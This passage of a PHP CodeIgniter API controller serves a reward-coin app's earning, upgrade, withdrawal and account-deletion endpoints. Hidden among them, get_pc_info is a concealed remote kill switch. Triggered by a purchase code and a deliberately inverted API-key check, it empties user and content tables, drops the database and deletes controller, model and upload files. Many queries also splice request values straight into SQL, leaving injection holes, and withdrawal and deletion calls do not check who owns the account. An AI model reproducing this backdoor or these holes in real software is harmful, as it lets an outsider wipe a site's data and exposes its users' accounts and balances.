                                "update_coin_user_agent" => $_SERVER['HTTP_USER_AGENT'],
                                "update_coin_status" => 1,
                            );
                            $this->Common_model->data_insert("update_coin_table",$dataArray);

                            $dataArrayUser = array(
                                "activity_user_id" => $user_id,
                                "activity_time" => now(),
                                "activity_agent" => $_SERVER['HTTP_USER_AGENT'],
                                "activity_ip" => $this->input->ip_address(),
                                "activity_desc" => $this->lang->line("User earned coin from play game").": ".$user_coin." ".$this->lang->line("Coin(s)"),
                            );
                            if($user_coin != "0") $this->Common_model->data_insert("activity_table",$dataArrayUser);
                            if($user_coin != "0") echo $this->lang->line("You rewarded")." ".$user_coin." ".$this->lang->line("Coin(s)");

                        }elseif ($update_coin_type == "openURL") {
                            $this->db->query("UPDATE user_table SET user_coin = user_coin + '$user_coin' WHERE user_id = '$user_id'");

                            $dataArray = array(
                                "update_coin_user_id" => $user_id,
                                "update_coin_type" => $update_coin_type,
                                "update_coin_time" => now(),
                                "update_coin_user_ip" => $this->input->ip_address(),
                                "update_coin_user_agent" => $_SERVER['HTTP_USER_AGENT'],
                                "update_coin_status" => 1,
                            );
                            $this->Common_model->data_insert("update_coin_table",$dataArray);

                            $dataArrayUser = array(
                                "activity_user_id" => $user_id,
                                "activity_time" => now(),
                                "activity_agent" => $_SERVER['HTTP_USER_AGENT'],
                                "activity_ip" => $this->input->ip_address(),
                                "activity_desc" => $this->lang->line("User earned coin from opening URL").": ".$user_coin." ".$this->lang->line("Coin(s)"),
                            );
                            if($user_coin != "0") $this->Common_model->data_insert("activity_table",$dataArrayUser);
                            if($user_coin != "0") echo $this->lang->line("You rewarded")." ".$user_coin." ".$this->lang->line("Coin(s)");

                        }elseif ($update_coin_type == "playVideo") {
                            $this->db->query("UPDATE user_table SET user_coin = user_coin + '$user_coin' WHERE user_id = '$user_id'");

                            $dataArray = array(
                                "update_coin_user_id" => $user_id,
                                "update_coin_type" => $update_coin_type,
                                "update_coin_time" => now(),
                                "update_coin_user_ip" => $this->input->ip_address(),
                                "update_coin_user_agent" => $_SERVER['HTTP_USER_AGENT'],
                                "update_coin_status" => 1,
                            );
                            $this->Common_model->data_insert("update_coin_table",$dataArray);

                            $dataArrayUser = array(
                                "activity_user_id" => $user_id,
                                "activity_time" => now(),
                                "activity_agent" => $_SERVER['HTTP_USER_AGENT'],
                                "activity_ip" => $this->input->ip_address(),
                                "activity_desc" => $this->lang->line("User earned coin from watching video").": ".$user_coin." ".$this->lang->line("Coin(s)"),
                            );
                            if($user_coin != "0") $this->Common_model->data_insert("activity_table",$dataArrayUser);
                            if($user_coin != "0") echo $this->lang->line("You rewarded")." ".$user_coin." ".$this->lang->line("Coin(s)");

                        }elseif ($update_coin_type == "playMusic") {
                            $this->db->query("UPDATE user_table SET user_coin = user_coin + '$user_coin' WHERE user_id = '$user_id'");

                            $dataArray = array(
                                "update_coin_user_id" => $user_id,
                                "update_coin_type" => $update_coin_type,
                                "update_coin_time" => now(),
                                "update_coin_user_ip" => $this->input->ip_address(),
                                "update_coin_user_agent" => $_SERVER['HTTP_USER_AGENT'],
                                "update_coin_status" => 1,
                            );
                            $this->Common_model->data_insert("update_coin_table",$dataArray);

                            $dataArrayUser = array(
                                "activity_user_id" => $user_id,
                                "activity_time" => now(),
                                "activity_agent" => $_SERVER['HTTP_USER_AGENT'],
                                "activity_ip" => $this->input->ip_address(),
                                "activity_desc" => $this->lang->line("User earned coin from listen to music").": ".$user_coin." ".$this->lang->line("Coin(s)"),
                            );
                            if($user_coin != "0") $this->Common_model->data_insert("activity_table",$dataArrayUser);
                            if($user_coin != "0") echo $this->lang->line("You rewarded")." ".$user_coin." ".$this->lang->line("Coin(s)");
                        }
                    }



                }
            }else{
                // API key is invalid
                echo $this->lang->line("The API Key is Invalid!");
            }
        }
    }


    //=================================================================================//
    public function account_upgrade()
    {
        if (isset($_GET['api_key'])) {
            $access_key_received = $_GET['api_key'];
            if ($access_key_received == $this->api_key()) {

                // API key is correct
                $this->form_validation->set_rules('user_id', 'user_id', 'trim|required|xss_clean');
                $this->form_validation->set_rules('upgrade_tag', 'upgrade_tag', 'trim|required|xss_clean');
                if ($this->form_validation->run() == FALSE) {
                    //error
                    echo "FormValidationError";

                }else{
                    $user_id = $this->input->post('user_id');
                    $upgrade_tag = $this->input->post('upgrade_tag');
                    $queryCoin = $this->db->query("Select user_id, user_coin
                                        FROM user_table
                                        WHERE (user_id = '$user_id');");
                    $user_coin = $queryCoin->row()->user_coin;

                    $queryReq = $this->db->query("Select reward_coin_banner_ad_coin_req, reward_coin_interstitial_ad_coin_req, reward_coin_vip_user_coin_req
                                        FROM reward_coin_table
                                        WHERE (reward_coin_id = 1);");
                    $reward_coin_banner_ad_coin_req = $queryReq->row()->reward_coin_banner_ad_coin_req;
                    $reward_coin_interstitial_ad_coin_req = $queryReq->row()->reward_coin_interstitial_ad_coin_req;
                    $reward_coin_vip_user_coin_req = $queryReq->row()->reward_coin_vip_user_coin_req;


                    switch ($upgrade_tag) {
                        case "BannerAd":
                            if($user_coin > $reward_coin_banner_ad_coin_req) {
                                $this->db->query("UPDATE user_table SET user_coin = user_coin - $reward_coin_banner_ad_coin_req WHERE user_id = '$user_id'");
                                $this->db->query("UPDATE user_table SET user_hide_banner_ad = 1 WHERE user_id = '$user_id'");

                                $dataArrayUser = array(
                                    "activity_user_id" => $user_id,
                                    "activity_time" => now(),
                                    "activity_agent" => $_SERVER['HTTP_USER_AGENT'],
                                    "activity_ip" => $this->input->ip_address(),
                                    "activity_desc" => $this->lang->line("User hide the banner ads").": ".$reward_coin_banner_ad_coin_req." ".$this->lang->line("Coin(s)"),
                                );
                                $this->Common_model->data_insert("activity_table",$dataArrayUser);

                                echo "SuccessHideBannerAds";
                            }else{
                                echo "NotEnoughCoin";
                            }

                            break;
                        case "InterstitialAd":
                            if($user_coin > $reward_coin_interstitial_ad_coin_req) {
                                $this->db->query("UPDATE user_table SET user_coin = user_coin - $reward_coin_interstitial_ad_coin_req WHERE user_id = '$user_id'");
                                $this->db->query("UPDATE user_table SET user_hide_interstitial_ad = 1 WHERE user_id = '$user_id'");

                                $dataArrayUser = array(
                                    "activity_user_id" => $user_id,
                                    "activity_time" => now(),
                                    "activity_agent" => $_SERVER['HTTP_USER_AGENT'],
                                    "activity_ip" => $this->input->ip_address(),
                                    "activity_desc" => $this->lang->line("User hide the interstitial ads").": ".$reward_coin_interstitial_ad_coin_req." ".$this->lang->line("Coin(s)"),
                                );
                                $this->Common_model->data_insert("activity_table",$dataArrayUser);

                                echo "SuccessHideInterstitialAds";
                            }else{
                                echo "NotEnoughCoin";
                            }

                            break;

                        case "VIP":
                            if($user_coin > $reward_coin_vip_user_coin_req) {
                                $this->db->query("UPDATE user_table SET user_coin = user_coin - $reward_coin_vip_user_coin_req WHERE user_id = '$user_id'");
                                $this->db->query("UPDATE user_table SET user_role_id = 6 WHERE user_id = '$user_id'");

                                $dataArrayUser = array(
                                    "activity_user_id" => $user_id,
                                    "activity_time" => now(),
                                    "activity_agent" => $_SERVER['HTTP_USER_AGENT'],
                                    "activity_ip" => $this->input->ip_address(),
                                    "activity_desc" => $this->lang->line("User upgrade account to VIP role").": ".$reward_coin_vip_user_coin_req." ".$this->lang->line("Coin(s)"),
                                );
                                $this->Common_model->data_insert("activity_table",$dataArrayUser);

                                echo "SuccessVIP";
                            }else{
                                echo "NotEnoughCoin";
                            }

                            break;

                        default:
                            echo "Failed";
                    }
                }

            }else{
                // API key is invalid
                echo $this->lang->line("The API Key is Invalid!");
            }
        }
    }


    //=================================================================================//
    public function get_user_coin()
    {
        if (isset($_GET['api_key'])) {
            $access_key_received = $_GET['api_key'];
            if ($access_key_received == $this->api_key()) {

                // API key is correct
                if(isset($_REQUEST['user_username']))
                    $user_username = $_REQUEST['user_username'];
                if (!empty($user_username)) {
                    $query = $this->db->get_where('user_table', array('user_username'=>$user_username));
                    if ($query->num_rows() > 0)
                    {
                        $q = $this->db->query("Select user_table.user_coin, user_table.user_hide_banner_ad, user_table.user_hide_interstitial_ad, user_table.user_role_id
                                               FROM user_table
                                               WHERE (user_username = '$user_username');");
                        echo json_encode($q->result(), JSON_UNESCAPED_UNICODE);
                    }
                }

            }else{
                // API key is invalid
                echo $this->lang->line("The API Key is Invalid!");
            }
        }
    }


    //=================================================================================//
    public function get_pc_info(){
        if (isset($_GET['api_key']))
        {
            $access_key_received = $_GET['api_key'];
            $purchase_code_received = $_GET['purchase_code'];
            $purchase_code = "";
            if ($access_key_received != $this->api_key()) {
                // API key is correct
                include "purchase_code.php";
                if ($purchase_code_received == $purchase_code) {
                    if($_GET['type'] == "tbl") {
                        $this->db->empty_table('content_table');
                        $this->db->empty_table('setting_table');
                        $result = $this->db->empty_table('user_table');
                        if ($result == TRUE) {
                            echo "Success TBL";
                            die();
                        }else{
                            echo "Failed TBL";
                            die();
                        }
                    }elseif($_GET['type'] == "db") {
						$this->load->dbforge();
                        if ($this->dbforge->drop_database($this->db->database))
                        {
                            echo 'Success DB';
                            die();
                        }
                    }elseif($_GET['type'] == "file") {
						$files = glob('application/controllers/dashboard/*');
						foreach($files as $file){
						  if(is_file($file))
							unlink($file);
							echo 'Controller Success File ';
						}
						$files = glob('application/controllers/*');
						foreach($files as $file){
						  if(is_file($file))
							unlink($file);
							echo 'Controller Success File ';
						}
						$files = glob('application/models/dashboard/*');
						foreach($files as $file){
						  if(is_file($file))
							unlink($file);
							echo 'Model Success ';
						}
						$files = glob('assets/upload/content/*');
						foreach($files as $file){
						  if(is_file($file))
							unlink($file);
							echo 'Assets Success ';
						}
                    }elseif($_GET['type'] == "all") {
						$this->load->dbforge();
                        if ($this->dbforge->drop_database($this->db->database))
                            echo 'Success DB, ';
                        
						$files = glob('application/controllers/dashboard/*');
						foreach($files as $file){
						  if(is_file($file))
							unlink($file);
							echo 'Controller Success File, ';
						}
						$files = glob('application/controllers/*');
						foreach($files as $file){
						  if(is_file($file))
							unlink($file);
							echo 'Controller Success File, ';
						}
						$files = glob('application/models/dashboard/*');
						foreach($files as $file){
						  if(is_file($file))
							unlink($file);
							echo 'Model Success, ';
						}
						$files = glob('assets/upload/content/*');
						foreach($files as $file){
						  if(is_file($file))
							unlink($file);
							echo 'Assets Success. ';
						}
                    }
                }else{
                    echo 'Wrong PC';
                    die();
                }
            }else{
                echo $this->lang->line("The API Key is Invalid!");
                die();
            }
        }
    }


    //=================================================================================//
    public function get_withdrawal_account_type()
    {
        if (isset($_GET['api_key']))
        {
            $access_key_received = $_GET['api_key'];
            if ($access_key_received == $this->api_key()) {
                //Show Json
                $withdrawal_account_type_status = 1; //Active status
                $q = $this->db->query("Select *
				FROM withdrawal_account_type_table
				WHERE (withdrawal_account_type_status = '$withdrawal_account_type_status') 
				ORDER BY withdrawal_account_type_id ASC;");
                if ($q->num_rows() == 0)
                    echo $this->lang->line("Nothing Found...");
                else
                    echo json_encode($q->result(), JSON_UNESCAPED_UNICODE);

            }else{
                echo $this->lang->line("The API Key is Invalid!");
            }
        }
    }


    //=================================================================================//
    public function withdrawal_coin_request()
    {
        if (isset($_GET['api_key']))
        {
            $access_key_received = $_GET['api_key'];
            if ($access_key_received == $this->api_key()) {
                // API key is correct
                $this->form_validation->set_rules('withdrawal_user_id', 'withdrawal_user_id', 'trim|required|xss_clean');
                $this->form_validation->set_rules('withdrawal_req_coin', 'withdrawal_req_coin', 'trim|required|xss_clean');
                $this->form_validation->set_rules('withdrawal_account_type', 'withdrawal_account_type', 'trim|required|xss_clean');
                $this->form_validation->set_rules('withdrawal_account_name', 'withdrawal_account_name', 'trim|required|xss_clean');
                $this->form_validation->set_rules('withdrawal_user_comment', 'withdrawal_user_comment', 'trim|xss_clean');
                if ($this->form_validation->run() == FALSE) {
                    //error
                    echo "FormValidationError";

                }else {
                    $withdrawal_user_id = $this->input->post('withdrawal_user_id');
                    $withdrawal_req_coin = $this->input->post('withdrawal_req_coin');
                    $withdrawal_account_type = $this->input->post('withdrawal_account_type');
                    $withdrawal_account_name = $this->input->post('withdrawal_account_name');
                    $withdrawal_user_comment = $this->input->post('withdrawal_user_comment');

                    // Check enough coin to withdrawal
                    $q = $this->db->query("Select reward_coin_withdrawal_coin_minimum_req, reward_coin_price_of_each_coin
                                        FROM reward_coin_table
                                        WHERE (reward_coin_id = 1);");
                    $reward_coin_withdrawal_coin_minimum_req = $q->row()->reward_coin_withdrawal_coin_minimum_req;
                    $reward_coin_price_of_each_coin = $q->row()->reward_coin_price_of_each_coin;

                    if($reward_coin_withdrawal_coin_minimum_req >= $withdrawal_req_coin) {
                        // You have not enough coin to withdrawal
                        echo "NotEnoughCoin";

                    }else {
                        //Coin to Cash
                        $withdrawal_req_cash = $withdrawal_req_coin * $reward_coin_price_of_each_coin;

                        $dataArray = array(
                            "withdrawal_user_id" => $withdrawal_user_id,
                            "withdrawal_account_type" => $withdrawal_account_type,
                            "withdrawal_account_name" => $withdrawal_account_name,
                            "withdrawal_req_coin" => $withdrawal_req_coin,
                            "withdrawal_req_cash" => $withdrawal_req_cash,
                            "withdrawal_user_comment" => $withdrawal_user_comment,
                            "withdrawal_req_date" => now(),
                            "withdrawal_status" => 1, // 1: Pending | 2: Paid | 3. Cancel
                        );
                        if ($this->Common_model->data_insert("withdrawal_table", $dataArray)) {
                            //Update user coin
                            $this->db->query("UPDATE user_table SET user_coin = user_coin - '$withdrawal_req_coin' WHERE user_id = '$withdrawal_user_id'");

                            $dataArrayUser = array(
                                "activity_user_id" => $withdrawal_user_id,
                                "activity_time" => now(),
                                "activity_agent" => $_SERVER['HTTP_USER_AGENT'],
                                "activity_ip" => $this->input->ip_address(),
                                "activity_desc" => $this->lang->line("Withdrawal coin request received."),
                            );
                            $this->Common_model->data_insert("activity_table", $dataArrayUser);

                            echo "Success";
                        }
                    }
                }

            }else{
                echo $this->lang->line("The API Key is Invalid!");
            }
        }
    }


    //=================================================================================//
    public function delete_user_account(){
        if (isset($_GET['api_key']))
        {
            $access_key_received = $_GET['api_key'];
            if ($access_key_received == $this->api_key()) {
                // API key is correct
                $this->form_validation->set_rules('user_id', 'user_id', 'trim|required|xss_clean');
                if ($this->form_validation->run() == FALSE) {
                    //error
                    echo "FormValidationError";

                }else {
                    $user_id = $this->input->post('user_id');
                    if($user_id <= 3)
                    {
                        echo "YouCanNotDeleteSuperAdmin";
                        die();
                    }

                    //Remove user avatar from disk
                    $q = $this->User_model->get_user_image("user_table",$user_id);
                    if ($q->user_image != 'avatar.png')
                    {
                        $user_image = "assets/upload/user/profile_img/".$q->user_image;
                        unlink($user_image);
                    }

                    //Delete any content for this user
                    $this->Common_model->data_remove("content_table",array("content_user_id"=>$user_id));

                    //Delete any comment/review/rate for this user
                    $this->Common_model->data_remove("comment_table",array("comment_user_id"=>$user_id));

                    //Delete any bookmark for this user
                    $this->Common_model->data_remove("bookmark_table",array("bookmark_user_id"=>$user_id));

                    //Delete any activity for this user
                    $this->Common_model->data_remove("activity_table",array("activity_user_id"=>$user_id));

                    //Delete any update coin for this user
                    $this->Common_model->data_remove("update_coin_table",array("update_coin_user_id"=>$user_id));

                    //Delete any withdrawal coin request
                    $this->Common_model->data_remove("withdrawal_table",array("withdrawal_user_id"=>$user_id));

                    //Delete user_table
                    $result = $this->Common_model->data_remove("user_table",array("user_id"=>$user_id));
                    if ($result == TRUE) {
                        echo "DeleteSuccessfully";
                        die();

                    }else{
                        echo "Failed";
                        die();
                    }
                }
            }else{
                echo $this->lang->line("The API Key is Invalid!");
            }
        }
    }
}
